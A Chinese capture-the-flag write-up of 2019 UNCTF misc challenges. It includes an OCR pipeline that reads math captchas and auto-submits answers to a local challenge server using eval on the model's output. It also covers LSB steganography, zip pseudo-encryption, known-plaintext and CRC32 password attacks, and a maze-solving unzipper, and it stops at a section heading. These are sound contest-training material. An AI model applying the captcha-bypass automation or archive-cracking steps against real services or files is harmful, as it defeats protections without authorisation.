# RecurrentNetwork: [BLSTM, LSTM, SRU, BSRU, GRU]

# - The recommended configuration is CNN5+BLSTM / ResNet+BLSTM

# HiddenNum: [64, 128, 256]

# - This parameter indicates the number of nodes used to remember and store
past states.

# Optimizer: Loss function algorithm for calculating gradient.

# - [AdaBound, Adam, Momentum]

NeuralNet:

CNNNetwork: CNN5

RecurrentNetwork: BLSTM

HiddenNum: 64

KeepProb: 0.98

Optimizer: AdaBound

PreprocessCollapseRepeated: False

CTCMergeRepeated: True

CTCBeamWidth: 1

CTCTopPaths: 1

WarpCTC: False

# TrainsPath and TestPath: The local absolute path of your training and testing
set.

# DatasetPath: Package a sample of the TFRecords format from this path.

# TrainRegex and TestRegex: Default matching apple_20181010121212.jpg file.

# - The Default is .*?(?=_.*.)

# TestSetNum: This is an optional parameter that is used when you want to
extract some of the test set

# - from the training set when you are not preparing the test set separately.

# SavedSteps: A Session.run() execution is called a Step,

# - Used to save training progress, Default value is 100.

# ValidationSteps: Used to calculate accuracy, Default value is 500.

# TestSetNum: The number of test sets, if an automatic allocation strategy is
used (TestPath not set).

# EndAcc: Finish the training when the accuracy reaches [EndAcc*100]% and
other conditions.

# EndCost: Finish the training when the cost reaches EndCost and other
conditions.

# EndEpochs: Finish the training when the epoch is greater than the defined
epoch and other conditions.

# BatchSize: Number of samples selected for one training step.

# TestBatchSize: Number of samples selected for one validation step.

# LearningRate: Recommended value[0.01: MomentumOptimizer/AdamOptimizer, 0.001:
AdaBoundOptimizer]

Trains:

# 训练数据集的路径

TrainsPath: './dataset/ocr3step_trains.tfrecords'

# 测试数据集的路径

TestPath: './dataset/ocr3step_test.tfrecords'

# 生成的图片文件的路径

DatasetPath: [

"./datasets/"

]

TrainRegex: '.*?(?=_)' # 提取图片label的正则表达式

TestSetNum: 200

SavedSteps: 100

ValidationSteps: 500

EndAcc: 0.95

EndCost: 0.1

EndEpochs: 2

BatchSize: 30 # 根据本机性能调整

TestBatchSize: 15 # 根据本机性能调整

LearningRate: 0.001

DecayRate: 0.98

DecaySteps: 10000
```
##### 2.训练模型 

生成数据集之后就是训练了，使用上面的模型配置，运行python
train.py直接训练。使用GeForce GTX 1050 Ti跑了3分钟，完成训练。

##### 3.使用模型预测 

修改predict_testing.py,添加一次预测一张图片的函数，保存为predict.py，代码如下:
```
#!/usr/bin/env python3
# -*- coding:utf-8 -*-
# Author: kerlomz <kerlomz@gmail.com>
import io
import cv2
import numpy as np
import PIL.Image as PIL_Image
import tensorflow as tf
from importlib import import_module
from config import *
from constants import RunMode
from pretreatment import preprocessing
from framework import GraphOCR


def get_image_batch(img_bytes):

    def load_image(image_bytes):
        data_stream = io.BytesIO(image_bytes)
        pil_image = PIL_Image.open(data_stream)
        rgb = pil_image.split()
        size = pil_image.size

        if len(rgb) > 3 and REPLACE_TRANSPARENT:
            background = PIL_Image.new('RGB', pil_image.size, (255, 255, 255))
            background.paste(pil_image, (0, 0, size[0], size[1]), pil_image)
            pil_image = background

        if IMAGE_CHANNEL == 1:
            pil_image = pil_image.convert('L')

        im = np.array(pil_image)
        im = preprocessing(im, BINARYZATION, SMOOTH, BLUR).astype(np.float32)
        if RESIZE[0] == -1:
            ratio = RESIZE[1] / size[1]
            resize_width = int(ratio * size[0])
            im = cv2.resize(im, (resize_width, RESIZE[1]))
        else:
            im = cv2.resize(im, (RESIZE[0], RESIZE[1]))
        im = im.swapaxes(0, 1)
        return (im[:, :, np.newaxis] if IMAGE_CHANNEL == 1 else im[:, :]) / 255.

    return [load_image(index) for index in [img_bytes]]


def decode_maps(charset):
    return {index: char for index, char in enumerate(charset, 0)}


def predict_func(image_batch, _sess, dense_decoded, op_input):
    dense_decoded_code = _sess.run(dense_decoded, feed_dict={
        op_input: image_batch,
    })
    decoded_expression = []
    for item in dense_decoded_code:
        expression = ''

        for char_index in item:
            if char_index == -1:
                expression += ''
            else:
                expression += decode_maps(GEN_CHAR_SET)[char_index]
        decoded_expression.append(expression)
    return ''.join(decoded_expression) if len(decoded_expression) > 1 else decoded_expression[0]


if WARP_CTC:
    import_module('warpctc_tensorflow')
graph = tf.Graph()
tf_checkpoint = tf.train.latest_checkpoint(MODEL_PATH)
sess = tf.Session(
    graph=graph,
    config=tf.ConfigProto(
        # allow_soft_placement=True,
        # log_device_placement=True,
        gpu_options=tf.GPUOptions(
            allocator_type='BFC',
            # allow_growth=True,  # it will cause fragmentation.
            per_process_gpu_memory_fraction=0.01
        ))
)
graph_def = graph.as_graph_def()

with graph.as_default():
    sess.run(tf.global_variables_initializer())
    # with tf.gfile.GFile(COMPILE_MODEL_PATH.replace('.pb', '_{}.pb'.format(int(0.95 * 10000))), "rb") as f:
    #     graph_def_file = f.read()
    # graph_def.ParseFromString(graph_def_file)
    # print('{}.meta'.format(tf_checkpoint))
    model = GraphOCR(
        RunMode.Predict,
        NETWORK_MAP[NEU_CNN],
        NETWORK_MAP[NEU_RECURRENT]
    )
    model.build_graph()
    saver = tf.train.Saver(tf.global_variables())

    saver.restore(sess, tf.train.latest_checkpoint(MODEL_PATH))
    _ = tf.import_graph_def(graph_def, name="")

dense_decoded_op = sess.graph.get_tensor_by_name("dense_decoded:0")
x_op = sess.graph.get_tensor_by_name('input:0')
sess.graph.finalize()


def predict_img(img_bytes):
    batch = get_image_batch(img_bytes)
    return predict_func(
        batch,
        sess,
        dense_decoded_op,
        x_op,
    )
```


然后重新生成一个图片进行测试:
```
from code import gen_exp_pic
from predict import predict_img
from PIL import Image
import io

def image_to_byte_array(image:Image):
  imgByteArr = io.BytesIO()
  image.save(imgByteArr, format="jpeg")
  imgByteArr = imgByteArr.getvalue()
  return imgByteArr

r = gen_exp_pic()
# (<PIL.Image.Image image mode=RGB size=400x32 at 0x7F49A37E02B0>, '843+479*161', 77962)
img = image_to_byte_array(r[0])
predict_img(img)
# '843+479*161'
```

可以看到识别结果还是比较准确的。

3）计算表达式并提交 

使用代码获取验证码进行识别，并提交计算结果，获取flag,代码如下：
```
#!/usr/bin/env python
# coding=UTF-8

import re
import time
import hashlib
import base64
import json
import requests
from predict import predict_img

# 代理设置
proxy = 'http://127.0.0.1:8080'
use_proxy = False

MY_PROXY = None
if use_proxy:
    MY_PROXY = {
        # 本地代理，用于测试，如果不需要代理可以注释掉
        'http': proxy,
        'https': proxy,
    }

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36",
    'Upgrade-Insecure-Requests': '1',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en,ja;q=0.9,zh-HK;q=0.8',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',

}


def md5(data):
    md5 = hashlib.md5(data.encode('utf-8'))
    return md5.hexdigest()


def http_req(url, data=None, method='GET', params=None, json=False, cookies=None, proxies=MY_PROXY):
    if json:
        method = 'POST'
        json = data
        data = None
    if method == 'GET':
        params = data
        data = None
    r = requests.request(method, url, headers=headers, verify=False, json=json,
                         params=params, data=data, cookies=cookies, proxies=MY_PROXY)
    return r


def calc_req(url, data=None):
    global my_cookie
    result = http_req(url, data=data, cookies=my_cookie)
    my_cookie = result.cookies
    return result


calc_url = "http://127.0.0.1:8800/"
calc_pic = calc_url + "imgcode"
calc_check = calc_url + "checkexp"


def print_round(txt):
    round_txt = re.search("round.*", txt)
    if round_txt:
        print(round_txt[0])

my_cookie = {
}
r = calc_req(calc_url)
print_round(r.text)
# 由于10次图片识别不一定每次都正确，采用循环直到发现flag
while True:
    pic = calc_req(calc_pic)
    exp = predict_img(pic.content)
    result = eval(exp)
    time.sleep(0.3)
    r2 = calc_req(calc_check, {'result': result})
    print_round(r2.text)
    if len(r2.history) == 0:  # 没有302重定向，则输出结果
        print(r2.text)
        break
```

结果如下，有可能输出的round不同，因为有时验证码会识别错误，重新开始计算round:
```
round: 1 / 10
round: 2 / 10
round: 3 / 10
round: 4 / 10
round: 5 / 10
round: 6 / 10
round: 7 / 10
round: 8 / 10
round: 9 / 10
round: 10 / 10
this is what you want: flag{9cd6b8af2cad231c1125a2c7ce8f3681}
```

### 快乐游戏题
无

### 平淡生活下的秘密
#### 原理知识
1）	LSB隐写就是修改RGB颜色分量的最低二进制位也就是最低有效位（LSB），而人类的眼睛不会注意到这前后的变化，可以达到隐写的目的 

2）	png图片是一种无损压缩的位图片形格式，也只有在无损压缩或者无压缩的图片（BMP）上实现lsb隐写。如果图像是jpg图片的话，就没法使用lsb隐写了，原因是jpg图片对像数进行了有损压缩，我们修改的信息就可能会在压缩的过程中被破坏。而png图片虽然也有压缩，但却是无损压缩，这样我们修改的信息也就能得到正确的表达，不至于丢失。

#### 解题过程
1）使用stegsolve分析

2）发现blue plane 0有一个二维码

![](https://ctfwp.wetolink.com/2019unctf/secret/bfb823df95de52019b1bc4f5db30a8c7.png)

1.  扫码得到字符串，Y0u're_so_smart,but_it's_not_the_end

![](https://ctfwp.wetolink.com/2019unctf/secret/bbbb87a62b4e70339c370577caae1ec3.png)

1.  看来还没结束，仔细发现blue plane 0上面有一些像素点，应该知道还有LSB隐写数据

![](https://ctfwp.wetolink.com/2019unctf/secret/12d63f918a92cccfe2d2a0ba368db119.png)

1.  所以我们点击Analyse→Data Extract，选中LSB First、RGB、RGB的plane0

    ![](https://ctfwp.wetolink.com/2019unctf/secret/d61bb93077abe390578b783d590b48e2.png)

2.  发现PK开头，明显是一个压缩包，save bin保存，解压，显示文件已损坏

![](https://ctfwp.wetolink.com/2019unctf/secret/e3b60812dae9d90e047c4d99417497d2.png)

1.  用WinRAR自带的修复工具修复一下，WinRAR→工具→压缩文件修复

2.  显示解压需要密码，就是之前二维码扫出来的那个字符串

3.  得到flag ，unctf{This_i5_a_easy_lsb_steg}

![](https://ctfwp.wetolink.com/2019unctf/secret/0b54f2828d438181d89b0d0877c2d224.png)


### 亲爱的
#### 原理知识
1）	文件合成。
#### 解题过程
1）音乐文件听歌识曲分析是什么歌曲，分离文件。

2）根据提示找到对应的评论为解压密码。

3）解压完图片，把图片进行分离得到word。

4）word的右下角就拿到了flag的图片。

![page2image10674096](https://ctfwp.wetolink.com/2019unctf/dear/70062e90627f4afe762eb97b8d7f49ca.jpg)

打开音乐文件，并进行听歌识曲。分辨出来是什么歌曲。

![page2image10666192](https://ctfwp.wetolink.com/2019unctf/dear/a3920fc99f9ca900020347099b83d409.jpg)

使用foremost分离文件得到zip文件

解压发现有密码，提示有说是qq音乐的这个时间段。根据知道的歌名 去找这个评论

![page3image10666400](https://ctfwp.wetolink.com/2019unctf/dear/f75165bb8f02731349326605db6b7131.jpg)

得到解压密码:真的上头

![page4image10576416](https://ctfwp.wetolink.com/2019unctf/dear/cf95e46f873295f41251d21701ff0287.jpg)

解压得到图片

![page5image10538032](https://ctfwp.wetolink.com/2019unctf/dear/64937edeee41d485221018fdcdb7807c.jpg)

![page6image10535536](https://ctfwp.wetolink.com/2019unctf/dear/9aab70da1db0bad4135c480c81977792.jpg)

分离图片得到又一个zip

解压发现不是一个简单的zip。而是一个docx。改完后缀打开docx

![page6image10538656](https://ctfwp.wetolink.com/2019unctf/dear/4823e2ddc5911c1da5658edae8d2f1bb.jpg)

![page6image10541776](https://ctfwp.wetolink.com/2019unctf/dear/8cbf30a6aecaf9ebed89e3e8e85f0457.jpg)

上来就结婚??

![page7image10671392](https://ctfwp.wetolink.com/2019unctf/dear/6a6ef26120a33bb185e19395718a4abb.jpg)

这里就有两个解了，1是直接从word->media->image1.png

![page7image10670144](https://ctfwp.wetolink.com/2019unctf/dear/8cbf30a6aecaf9ebed89e3e8e85f0457.jpg)

![page8image27893184](https://ctfwp.wetolink.com/2019unctf/dear/7bb970300703d3a4cbc33c29f1c08ed4.png)

第二种就是慢慢发现flag在右下角比较明显

得到flag文件

![page9image10576624](https://ctfwp.wetolink.com/2019unctf/dear/d5599184d7f8648ee65f7bd41671fe56.jpg)


### 无限迷宫
#### 原理知识
1）	opencv处理图片，过滤颜色，查找轮廓，直线检测等知识的运用 

2）	graph的构造，寻路方法的算法

3）	使用python处理zip文件

#### 解题过程
1. 问题分析

打开下载的图片是一个迷宫，如图1。

![](https://ctfwp.wetolink.com/2019unctf/maze/1.png)

 图 1: 下载的图片

图片比较小，但是文件很大，使用010 editor打开下载的图片，发现文件后面有很长的附加数据，如图2. 看文件开头为PK,可能是zip文件。

![](https://ctfwp.wetolink.com/2019unctf/maze/2.png)

 图 2: 010 editor截图

于是使用7-zip打开图片文件,可以看到是加了密的zip文件，里面有个flag.jpg，如图3。

![](https://ctfwp.wetolink.com/2019unctf/maze/3.png)

 图 3: 7-zip截图

根据题目的提示:上下左右，1234。猜测迷宫的路径可能就是zip的密码，每一步所走的方向,即上下左右对应1234.

2. 解决方案

因为迷宫为图片，手工走迷宫太累，使用图像处理的方法解决问题。

使用图像处理的方法走迷宫需要下面几个步骤：


+ 1.  识别出开始和目标位置  
+ 2.  识别出迷宫的网格，才能确定走的每一个格子  
+ 3.  根据识别出的网格，转换迷宫图片为graph。  
+ 4.  使用寻路方法，寻找开始位置的格子到目标位置格子的最短路径。  
+ 5.  把找到的路径转换为每一步要走的方向  
+ 6.  转换方向为对应的1234，获得zip文件的密码  
    

转换为代码如下:
```
#!/usr/bin/env python3
# coding=utf-8

# 安装必备工具和库
# apt-get install unzip
# pip3 install numpy
# pip3 install opencv-python

from os.path import isfile, join
from os import listdir
import os
import shutil
import subprocess
from collections import Counter
import math
import cv2 as cv
import numpy as np
import logging


def find_color_max_rect(img, lower, upper):
    ''' 查找lower-upper指定的颜色区域最大的轮廓,
    lower, upper为hsv颜色空间'''
    hsv = cv.cvtColor(img, cv.COLOR_BGR2HSV)

    # 过滤出红色，(指示起点的图片)
    binary = cv.inRange(hsv, lower, upper)

    # 闭运算，消除起始图片中的空洞
    kernel = np.ones((20, 20), np.uint8)
    closing = cv.morphologyEx(binary, cv.MORPH_CLOSE, kernel)

    # 查找起始图片的轮廓
    contours, _ = cv.findContours(
        closing, cv.RETR_EXTERNAL, cv.CHAIN_APPROX_SIMPLE)
    logging.info("find start contours:%d" % len(contours))

    # 返回面积最大的轮廓
    max_area = 0
    for c in contours:
        c_area = cv.contourArea(c)
        if c_area > max_area:
            max_area = c_area
            max_c = c
    return cv.boundingRect(max_c)


def find_start(img):
    ''' 查找开始位置--迷宫开始图片的矩形'''
    lower_red = np.array([0, 0, 100])
    upper_red = np.array([15, 255, 200])
    return find_color_max_rect(img, lower_red, upper_red)


def find_end(img):
    ''' 查找结束位置--迷宫目标图片的矩形'''
    lower_yellow = np.array([20, 0, 100])
    upper_yellow = np.array([30, 250, 250])
    return find_color_max_rect(img, lower_yellow, upper_yellow)


def show_rects(img, rects):
    "显示矩形区域"
    ret = img.copy()
    for [x, y, w, h] in rects:
        cv.rectangle(ret, (x, y), (x+w, y+h), (0, 0, 255), 2)
    cv.imshow('rects', ret)
    cv.imwrite('show.jpg', ret)
    cv.waitKey(0)


def uniq_lines(lines, precision=5):
    '''按照precision指定的误差统一直线'''
    sort_lines = lines.copy()
    sort_lines.sort()
    uniq_sort_lines = list(set(sort_lines))
    uniq_sort_lines.sort()
    prev = uniq_sort_lines[0]
    result = [prev]
    for p in uniq_sort_lines[1:]:
        diff = abs(p - prev)
        if diff > precision:
            result.append(p)
        else:
            # 在误差范围内，纠正上一个值，保存为两条线的中间值
            mp = min(p, prev)
            result[-1] = (mp + int(diff/2))
        prev = p
    return result


def find_lines(img, min_length=50):
    "查找线条，返回[horz_lines, vert_lines]"
    src = cv.cvtColor(img, cv.COLOR_BGR2GRAY)
    src = cv.GaussianBlur(src, (5, 5), 0)
    edges = cv.Canny(src, 50, 150, None, 3)

    # 霍夫变换检测直线
    lines = cv.HoughLinesP(edges, 1, np.pi / 180, 50, None, min_length, 10)

    # 把误差较小的直线合并
    horz_lines = []
    vert_lines = []
    for ls in lines:
        x1, y1, x2, y2 = ls[0]
        if y1 == y2:
            horz_lines.append(y1)
        elif x1 == x2:
            vert_lines.append(x1)

    horz_lines = uniq_lines(horz_lines)
    vert_lines = uniq_lines(vert_lines)
    return [horz_lines, vert_lines]


def clear_rect(img, rect):
    "清除img中rect指定的区域图像"
    x, y, w, h = rect
    img[y:y+h, x:x+w] = 255
    return img


def best_grid_size(grids):
    "返回最合适的grid大小"
    items = grids[0]
    diffs = [x-y for x, y in zip(items[1:], items[:-1])]
    items2 = grids[1]
    diffs2 = [x-y for x, y in zip(items2[1:], items2[:-1])]
    c = Counter(diffs+diffs2)
    return c.most_common(1)[0][0]


def make_grid_pos(length, grid_size):
    '''根据网格大小生成网格线位置'''
    return [i*grid_size for i in range(int(length/grid_size)+1)]


def find_grid_lines(img, start_rect, end_rect, min_length=50):
    "查找图片的网格线"
    img2 = img.copy()
    # 清理掉开始和结束的图片,提高精确度
    img2 = clear_rect(img2, start_rect)
    img2 = clear_rect(img2, end_rect)
    grids = find_lines(img2, min_length)

    # 使用查找到的线条重新生成网格线，防止漏掉某些线
    grid_size = best_grid_size(grids)
    y, x, _ = img.shape
    hls = make_grid_pos(y, grid_size)
    vls = make_grid_pos(x, grid_size)
    return [hls, vls]


def show_grid(img, horz_lines, vert_lines):
    '''显示网格线'''
    ret = img.copy()
    for y in horz_lines:
        cv.line(ret, (0, y), (10000, y), (255, 0, 0), 2)
    for x in vert_lines:
        cv.line(ret, (x, 0), (x, 10000), (255, 0, 0), 2)
    cv.imwrite("show_grid.jpg", ret)
    cv.imshow("grid", ret)
    cv.waitKey(0)


def in_thresh(source, target, thresh):
    '''是否在阈值范围内'''
    return target-thresh <= source <= target+thresh


def count_range_color(img, x, y, width, height, color, color_thresh=40):
    '''统计矩形范围内指定颜色像素的个数'''
    count = 0
    for i in range(width):
        for j in range(height):
            sb, sg, sr = img[y+j][x+i]
            tb, tg, tr = color
            if in_thresh(sb, tb, color_thresh) and in_thresh(sg, tg, color_thresh) and in_thresh(sr, tr, color_thresh):
                count += 1
    return count


# 墙的颜色
wall = (0, 0, 0)


def fix_v(x, max_v):
    "修正x,使0 <= x <= max_v"
    x = min(x, max_v)
    x = max(0, x)
    return x


def fix_x(img, x):
    return fix_v(x, img.shape[1])


def fix_y(img, y):
    return fix_v(y, img.shape[0])


def is_horz_wall(img, x, y, grid_size, precision=3):
    "是否是水平方向的墙 x,y为图片坐标, precision为选取测试的矩形范围,增强容错"
    w = int(grid_size / 2)  # 取中间的一半长度进行测试
    h = precision*2
    x = x + int(w/2)
    y = y - precision
    w = fix_x(img, x+w)-x
    h = fix_y(img, y+h)-y
    x = fix_x(img, x)
    y = fix_y(img, y)
    count = count_range_color(img, x, y, w, h, wall)
    logging.info(f"x:{x}, y:{y}, w:{w}, h:{h} count:{count}")
    if count >= w*0.8:
        return True
    return False


def is_vert_wall(img, x, y, grid_size, precision=3):
    "是否是垂直方向的墙 x,y为图片坐标"
    w = precision*2
    h = int(grid_size / 2)  # 取中间的一半长度进行测试
    x = x - precision
    y = y + int(h/2)
    w = fix_x(img, x+w)-x
    h = fix_y(img, y+h)-y
    x = fix_x(img, x)
    y = fix_y(img, y)
    count = count_range_color(img, x, y, w, h, wall)
    logging.info(f"x:{x}, y:{y}, w:{w}, h:{h} count:{count}")
    if count >= h*0.8:
        return True
    return False


def check_wall(img, grid_lines, x, y):
    "检测x,y指定格子四周是否有墙, 返回[上, 下, 左, 右]是否有墙的bool值"
    logging.info(f"check wall x:{x}, y:{y}")
    hls, vls = grid_lines
    grid_size = min(hls[1]-hls[0], vls[1]-vls[0])
    # left = x * grid_size + vls[0]
    # top = y * grid_size + hls[0]
    # right = left + grid_size
    # bottom = top + grid_size
    left = vls[x]
    right = vls[fix_v(x+1, len(vls)-1)]
    top = hls[y]
    bottom = hls[fix_v(y+1, len(hls)-1)]
    logging.info(f"left:{left}, right:{right}, top:{top}, bottom:{bottom}")
    top_wall = is_horz_wall(img, left, top, grid_size)
    bottom_wall = is_horz_wall(img, left, bottom, grid_size)
    left_wall = is_vert_wall(img, left, top, grid_size)
    right_wall = is_vert_wall(img, right, top, grid_size)
    return [top_wall, bottom_wall, left_wall, right_wall]


def find_in_range_pos(ranges, v):
    '''ranges必须为升序列表，
    查找v在ranges中的第一个位置索引'''
    for idx, v2 in enumerate(ranges):
        if v2 >= v:
            return idx
    return None


def find_grid_pos(img, grid_lines, x, y):
    "查找图像坐标x,y所在的格子"
    hls, vls = grid_lines
    x_pos = find_in_range_pos(vls, x) - 1
    y_pos = find_in_range_pos(hls, y) - 1
    return [x_pos, y_pos]


def rect_center(rect):
    '''计算矩形中心点'''
    x, y, w, h = rect
    return [x+int(w/2), y+int(h/2)]

# -------------------------------- maze 算法


def format_node(x, y):
    "格式化节点的表示"
    return f"{x}-{y}"


def generate_graph(img, grids):
    "从图片中生成graph"
    hls, vls = grids
    width = len(vls)-1
    height = len(hls)-1
    verticies = 0
    edges = 0
    graph = {}

    logging.info(f"width:{width}, height:{height}")
    for x in range(width):
        for y in range(height):
            verticies += 1

            node = format_node(x, y)
            graph[node] = set()

            top, down, left, right = check_wall(img, grids, x, y)

            if x >= 1:
                if not left:
                    graph[node].add(format_node(x-1, y))
                    edges += 1
            if x+1 < width:
                if not right:
                    graph[node].add(format_node(x+1, y))
                    edges += 1
            if y >= 1:
                if not top:
                    graph[node].add(format_node(x, y-1))
                    edges += 1
            if y+1 < height:
                if not down:
                    graph[node].add(format_node(x, y+1))
                    edges += 1

    print(verticies, "verticies")
    print(edges, "edges")

    return graph


def bfs_paths(graph, start, goal):
    queue = [(start, [start])]
    while queue:
        (vertex, path) = queue.pop(0)
        for next in graph[vertex] - set(path):
            if next == goal:
                yield path + [next]
            else:
                queue.append((next, path + [next]))


def shortest_path(graph, start, goal):
    '''查找最短路径'''
    try:
        return next(bfs_paths(graph, start, goal))
    except StopIteration:
        return None


def parse_node(node):
    "解析node为x,y坐标"
    return [int(i) for i in node.split('-')]


def get_direction(route):
    "获取路由每一步的方向，上下左右对应为1234"
    prev = parse_node(route[0])
    directs = []
    for curr in route[1:]:
        curr = parse_node(curr)
        x1, y1 = prev
        x2, y2 = curr
        if y2 < y1:
            directs.append('1')
        elif y2 > y1:
            directs.append('2')
        elif x2 < x1:
            directs.append('3')
        elif x2 > x1:
            directs.append('4')
        else:
            logging.error(f"error direction prev:{prev} current:{curr}")
        prev = curr
    return ''.join(directs)


def solve_maze(filename):
    '''解一个迷宫图片，返回每一步的路径'''
    img = cv.imread(filename)
    start = find_start(img)
    end = find_end(img)
    logging.info(f"image {filename} start pos: {start}, end pos: {end}.")
    # cv.imwrite("out.jpg", img)
    # show_rects(img, [start, end])

    # 格子的最小长度
    min_len = min(start[2], start[3], end[2], end[3])

    # 获取网格线
    grids = find_grid_lines(img, start, end, min_len)
    # show_grid(img, grids[0], grids[1])

    start_center = rect_center(start)
    start_pos = find_grid_pos(img, grids, start_center[0], start_center[1])
    end_center = rect_center(end)
    end_pos = find_grid_pos(img, grids, end_center[0], end_center[1])
    logging.info(f"start grid pos:{start_pos}, end grid pos:{end_pos}.")
    # check_wall(img, grids, x, y)

    g = generate_graph(img, grids)
    start_node = format_node(start_pos[0], start_pos[1])
    end_node = format_node(end_pos[0], end_pos[1])
    return [g, shortest_path(g, start_node, end_node)]

# --------------------------------- zip操作
zip_tmp = 'ziptmp/'


def unzip_file(filename, password):
    "解压zip文件，返回解压的文件列表"
    # 先解压到临时目录中
    if os.path.exists(zip_tmp):
        shutil.rmtree(zip_tmp)
    os.mkdir(zip_tmp)
    subprocess.run(['unzip', '-o', '-P', password, filename, '-d', zip_tmp])
    files = [f for f in listdir(zip_tmp) if isfile(join(zip_tmp, f))]
    print(f"unzip files:{files}.")
    # 然后把文件移动出来
    for f in files:
        if os.path.exists(f):
            os.unlink(f)
        shutil.move(join(zip_tmp, f), "./")
    return files


logging.getLogger().setLevel(logging.WARN)

count = 0
fname = "infinity_maze.jpg"

while True:
    g, route = solve_maze(fname)
    answer = get_direction(route)
    files = unzip_file(fname, answer)
    count += 1
    print(f"count: {count}")
    fname = "flag.jpg"
    if not fname in files:
        break

print("over!")
```

不断地解决迷宫，解压文件，经过128次之后，最终获得flag.txt文件，如图4。

![](https://ctfwp.wetolink.com/2019unctf/maze/4.png)


 图 4: 代码结果


注意这里解压zip文件使用了linux下的unzip工具，可以自动识别解压jpg文件末尾的zip文件。如果用python实现需要先提取出zip文件，再进行解压。 


### 信号不好我先挂了
#### 原理知识
1）	两张图片进行了快速傅里叶变换相加之后生成了一张图片。并将一张图片的信息隐藏起来。

2）	我们需要做的就是逆向操作，将变换后的图片再进行快速傅里叶变换减去原图的快速傅里叶变换之后再进行反傅里叶变换得到隐藏的水印信息。

#### 解题过程
1）	下载文件得到一个 apple.png。
2）	使用Stegsolve打开,lsb frist查看最低位，save bin 得到一个zip文件。

![](https://ctfwp.wetolink.com/2019unctf/no_signal/1.png)

3）	压缩包没有密码，解压得到pen.png,根据这两张图片的名字联想到（I have apple，I have pen bong!! apple-pen.😉）,是要用对两张图片一起进行操作。又根据题目的名字：《信号不好我先挂了》。联想到《信号与系统》这门炒鸡难的学科。所以使用快速傅里叶变换对着两张图片进行操作得到隐藏的水印信息。
4）	写python脚本进行解密，得到flag:unctf{9d0649505b702643}.

![](https://ctfwp.wetolink.com/2019unctf/no_signal/2.png)

### 压缩大礼包
#### 原理知识
1）	zip压缩的缺陷

2）	CRC32校验

3）	文件二进制操作

4）	1.去除压缩包后缀

2.解压后为没有密码的压缩包，内容是假的。真正的下一个压缩包用二进制写在注释内

3.第三个压缩包是伪加密

4.明文爆破（123#qwe!）

5.第5个压缩包是CRC32爆破（welc0m e_To_7 his_un _ctf__）

6.第6个压缩包加密的，密码在注释内，使用不可见字符，解压密码用摩斯密码表达(-..- ..--- ...-- ...-- ...-. --.-. ..-. ----. ----.)(X233$@F99)

7.解压出来是一张图片6.jpg，图片内加了一个压缩包，需要修复文件头

8.最后解压出来的一个压缩包数字爆破即可得到flag.txt。

#### 解题过程
1.  发现是一个名称为1的文件，根据题目提示添加后缀rar，改为1.rar，解压得到2.rar

2.  2解压出来的txt无用，下一个压缩包藏在注释里

![](https://ctfwp.wetolink.com/2019unctf/compress_gift/339522179dd1cd8727b5294b7bd5b335.png)

1.  把十六进制文件复制到HxD保存，得到压缩包命名为3.zip

![](https://ctfwp.wetolink.com/2019unctf/compress_gift/6094fc5b2ab318a99a2e7dcd22fba335.png)

1.  发现3.zip内有两个文件，解压需要密码，爆破不出来，猜测是伪加密

![](https://ctfwp.wetolink.com/2019unctf/compress_gift/3df3a823d352c659e137479f2dd9eb22.png)

1.  在kali中直接解压或者通过HxD等软件修改加密位，解压得到4.zip和readme.txt。

>   解开5.zip需要密码

![](https://ctfwp.wetolink.com/2019unctf/compress_gift/f64ee628e2ca988cb42d4f2769c20f80.png)

1.  打开看readme.txt，只是简单的文字。

![](https://ctfwp.wetolink.com/2019unctf/compress_gift/64f5c0a3509bce3fbb83859ad7ff15bc.png)

1.  4.zip内也有readme.txt，猜测可能是明文攻击,把readme.txt压缩成zip，对比CRC32，确认是明文攻击

![](https://ctfwp.wetolink.com/2019unctf/compress_gift/8646d89dff058c82d0bbe8e5b5210109.png)

1.  使用工具Advanced ZIP Password
    Recovery进行明文爆破攻击。爆破成功，解压密码为`123#qwe!`

![](https://ctfwp.wetolink.com/2019unctf/compress_gift/d5673e1f0114ba4eb882c01c138d1c98.png)

1.  打开5.zip,发现有好几个txt,内容都比较小，解压需要密码，猜测是CRC32爆破

![](https://ctfwp.wetolink.com/2019unctf/compress_gift/5d6034f2b6cd66a6ab4ef88f710061a9.png)

>   使用脚本进行CRC32爆破，得到密码**welc0me_To_7his_un_ctf__**

1.  打开6.zip,发现有隐藏注释，复制到notepad++或者sublime，设置显示不可见字符

![](https://ctfwp.wetolink.com/2019unctf/compress_gift/bb54676fd4012fdbb36658ce52da1e2c.png)

1.  看到内容猜测，可能是摩斯密码，"."代表短"-"代表长，解密得X233$@F99

![](https://ctfwp.wetolink.com/2019unctf/compress_gift/43dadd37855c3f6c911f72e220323736.png)

1.  解压后得到一张图片，怀疑可能是图种。Binwalk分析有东西。然后直接foremost命令分离

![](https://ctfwp.wetolink.com/2019unctf/compress_gift/091658fdc6422c34a186ce58a4825ff2.png)

1.  分离出来的压缩包损坏了，修复一下

![](https://ctfwp.wetolink.com/2019unctf/compress_gift/cb595ad537a82ca43580d14c04a5a64c.png)

![](https://ctfwp.wetolink.com/2019unctf/compress_gift/87cd0b09ab3579bb624be15eae71f940.png)

1.  得到最后一个压缩包，弱密码爆破，四位纯数字，密码是8745

    ![](https://ctfwp.wetolink.com/2019unctf/compress_gift/3439420d9e72530fe29437c2c902fd56.png)

2.  得到flag.txt

![](https://ctfwp.wetolink.com/2019unctf/compress_gift/7ea81a1e837ee429ce6eb4bda039d304.png)

1.  base64解密，得到flag

>   unctf{D0_y0U_1!kE_rAR_?}

![](https://ctfwp.wetolink.com/2019unctf/compress_gift/95fd8fb570474c0ca6b17235fe349de2.png)


### 云深不知处
#### 原理知识
1) 云影密码
#### 解题过程
1）打开浏览器，访问目标主机下载压缩包

2）打开压缩包，可以发现有一个txt文件，打开后可以看到其中内容如下：

![](https://ctfwp.wetolink.com/2019unctf/cloud/1.png)

可以看到字符由01248构成，可以猜到是云影密码，解密方式如下：
0为间隔字符，其他数字由加法表示，如本题第一个字母2+4+2+4+2+8+2+1=25 为Y
通过解密可得密码：youaremyhero


### 长安十二时辰
#### 原理知识
1）	信息的搜集

2）	栅栏密码的加密方式：把文本按照一定的字数分成多个组，取每组第一个字连起来得到密文1，再取每组第二个字连起来得到密文2……最后把密文1、密文2……连成整段密文。

#### 解题过程
